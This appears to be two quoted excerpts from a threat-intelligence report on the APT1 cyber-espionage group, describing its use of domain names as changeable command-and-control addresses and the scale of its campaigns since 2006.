The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors. In the last several years we have confirmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a specific hop point (IP address) they can \"point\" the C2 FQDN address to a different IP address and resume their control over victim backdoors. This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked."

We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1’s operations compelled us to write this report."
